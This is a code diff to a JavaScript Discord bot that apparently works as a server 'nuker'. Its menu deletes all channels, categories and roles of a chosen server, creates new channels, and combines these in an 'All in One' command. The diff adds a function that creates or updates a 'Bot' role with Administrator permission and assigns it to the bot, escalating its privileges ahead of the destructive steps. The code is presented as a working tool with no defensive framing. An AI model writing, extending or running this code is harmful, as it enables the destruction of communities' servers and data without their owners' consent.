@@ -156,8 +156,9 @@ async function startTerminalInterface() {
     guilds.forEach((guild, index) => {
         console.log(`${index + 1}. ${guild.name}`);
     });
+    console.log('');
     
-    const serverChoice = await askQuestion('\nSelect server (number): ');
+    const serverChoice = await askQuestion('Select server (number): ');
     const selectedGuild = guilds[parseInt(serverChoice) - 1];
     
     if (!selectedGuild) {
@@ -172,27 +173,31 @@ async function startTerminalInterface() {
     
     while (true) {
         console.log('\nAvailable commands:');
-        console.log('1. Delete all channels and categories');
-        console.log('2. Delete all roles');
-        console.log('3. Create channels');
-        console.log('4. All in One');
-        console.log('5. Exit');
+        console.log('1. Give permissions');
+        console.log('2. Delete all channels and categories');
+        console.log('3. Delete all roles');
+        console.log('4. Create channels');
+        console.log('5. All in One');
+        console.log('6. Exit');
+        console.log('');
         
-        const commandChoice = await askQuestion('\nSelect command (number): ');
+        const commandChoice = await askQuestion('Select command (number): ');
         
         if (commandChoice === '1') {
-            await checkBotRolePosition(selectedGuild);
-            await deleteAllChannels(selectedGuild);
+            await givePermissions(selectedGuild);
         } else if (commandChoice === '2') {
             await checkBotRolePosition(selectedGuild);
-            await deleteAllRoles(selectedGuild);
+            await deleteAllChannels(selectedGuild);
         } else if (commandChoice === '3') {
             await checkBotRolePosition(selectedGuild);
-            await createChannels(selectedGuild);
+            await deleteAllRoles(selectedGuild);
         } else if (commandChoice === '4') {
             await checkBotRolePosition(selectedGuild);
-            await allInOne(selectedGuild);
+            await createChannels(selectedGuild);
         } else if (commandChoice === '5') {
+            await checkBotRolePosition(selectedGuild);
+            await allInOne(selectedGuild);
+        } else if (commandChoice === '6') {
             console.log('Goodbye!');
             break;
         } else {
@@ -324,6 +329,44 @@ async function allInOne(guild) {
     }
     
     console.log('All in One operation completed!');
+}
+
+async function givePermissions(guild) {
+    try {
+        console.log('Setting up bot permissions...');
+        
+        const botMember = await guild.members.fetchMe();
+        
+        let botRole = guild.roles.cache.find(role => role.name === 'Bot');
+        
+        if (!botRole) {
+            console.log('Creating "Bot" role with admin permissions...');
+            botRole = await guild.roles.create({
+                name: 'Bot',
+                permissions: ['Administrator'],
+                color: 0x00ff00,
+                position: 0
+            });
+            console.log('✅ Created "Bot" role with admin permissions!');
+        } else {
+            console.log('Updating existing "Bot" role...');
+            await botRole.setPermissions(['Administrator']);
+            await botRole.setPosition(0);
+            console.log('✅ Updated "Bot" role with admin permissions!');
+        }
+        
+        if (!botMember.roles.cache.has(botRole.id)) {
+            console.log('Adding bot to "Bot" role...');
+            await botMember.roles.add(botRole);
+            console.log('✅ Bot added to "Bot" role!');
+        } else {
+            console.log('✅ Bot already has "Bot" role!');
+        }
+        
+        console.log('Permission setup completed!');
+    } catch (error) {
+        console.log(`❌ Error setting up permissions: ${error.message}`);
+    }
 }
 
 async function checkBotRolePosition(guild) {
